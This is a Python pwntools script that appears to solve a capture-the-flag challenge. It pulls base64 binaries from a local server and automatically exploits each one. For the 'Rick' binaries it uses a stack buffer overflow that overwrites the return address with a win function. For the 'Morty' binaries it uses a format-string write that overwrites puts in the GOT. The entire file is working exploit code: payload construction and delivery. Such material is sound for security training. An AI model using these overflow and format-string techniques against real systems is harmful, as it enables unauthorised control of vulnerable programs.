from pwn import *
from base64 import b64decode
MAX_FUNCTIONS = 10
def bufferOverflowBinary(base64Program):
    binaryName = "./vuln1"
    binary = b64decode(base64Program)
    f = open(binaryName, "wb")
    f.write(binary)
    f.close()
    elf = context.binary = ELF(binaryName)
    for i in range(0,MAX_FUNCTIONS):
        realRick = elf.symbols['iAmRealRick'+str(i)]
        tempDisasm = elf.disasm(realRick, 36)
        if "edi, 0x0" in tempDisasm:
            print(f"Real Rick is {i}: {hex(realRick)}")
            # print(tempDisasm)
            break
    payload = ("a"*256).encode() + p64(0xdeadbeefc0fec0de) + p64(realRick)
    os.remove(binaryName)
    return payload


def formatStringBinary(base64Program):
    binaryName = "./vuln2"
    binary = b64decode(base64Program)
    f = open(binaryName, "wb")
    f.write(binary)
    f.close()
    elf = context.binary = ELF(binaryName)
    for i in range(0,MAX_FUNCTIONS):
        realMorty = elf.symbols['iAmRealMorty'+str(i)]
        tempDisasm = elf.disasm(realMorty, 36)
        if "edi, 0x0" in tempDisasm:
            print(f"Real Morty is {i}: {hex(realMorty)}")
            # print(tempDisasm)
            break
    puts = elf.got['puts']
    print("puts: "+hex(puts))
    current = 0
    first = realMorty & 0xff
    second = (realMorty & 0xff00) >> 8
    third = (realMorty & 0xff0000) >> 16
    fourth = (realMorty & 0xff000000) >> 24

    def getNextNum(current, num):
        num = (num - current) & 0xFFFF
        current = num + current
        if num < 0:
            num = num + 0xff
        num = str(num).zfill(4)
        return current, num
    current, first = getNextNum(current, first)
    current, second = getNextNum(current, second)
    current, third = getNextNum(current, third)
    current, fourth = getNextNum(current, fourth)

    i = 18
    payload = f"%{first}c%{i}$hn%{second}c%{i+1}$hn%{third}c%{i+2}$hn%{fourth}c%{i+3}$n%{i+4}$n%{i+5}$n"
    alignPadding = (8 - (len(payload) % 8))*b"\00"
    payload = payload.encode() + alignPadding + p64(puts) + p64(puts+1) + \
        p64(puts+2) + p64(puts+3) + p64(puts+5) + p64(puts+6)
    os.remove(binaryName)
    return payload
    
if args.R:
    host = "0.0.0.0"
    port = 1338
else:
    host = "localhost"
    port = 1338
r = remote(host, port)

for i in range(0, 2):
    temp = r.readuntil("Message:\n".encode())
    base64Program = r.readuntil("Message end").decode()
    base64Program = base64Program[:-11].encode()
    if "Hi am Rick".encode() in b64decode(base64Program):
        print("bufferOverflowBinary Rick vuln")
        payload = bufferOverflowBinary(base64Program)
    elif "Hi am Morty".encode() in b64decode(base64Program):
        print("formatStringBinary Morty vuln")
        payload = formatStringBinary(base64Program)
    # print("Sending: {}".format(payload))
    r.sendlineafter("Enter your input:", payload)
r.interactive()
